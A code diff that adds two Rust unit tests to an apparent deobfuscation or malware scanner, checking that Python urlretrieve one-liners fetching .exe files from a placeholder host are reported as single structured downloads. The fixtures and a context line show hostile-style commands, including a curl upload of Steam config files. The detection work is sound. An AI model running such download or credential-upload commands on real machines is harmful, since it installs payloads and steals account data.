@@ -11708,6 +11708,72 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_urllib_urlretrieve_variable_destination_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; u = 'https://py.example/dst-var-file.exe'; f = 'dst-var-file.exe'; urllib.request.urlretrieve(u, f)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/dst-var-file.exe"
+                        && dst.as_deref() == Some("dst-var-file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download destination from Python urlretrieve variable destination: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/dst-var-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve variable destination URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_urlretrieve_literal_url_variable_destination_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; f = 'literal-dst-var-file.exe'; urllib.request.urlretrieve('https://py.example/literal-dst-var-file.exe', f)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/literal-dst-var-file.exe"
+                        && dst.as_deref() == Some("literal-dst-var-file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download destination from Python urlretrieve literal URL variable destination: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/literal-dst-var-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve literal URL variable destination URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_multiline_urlretrieve_alias_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
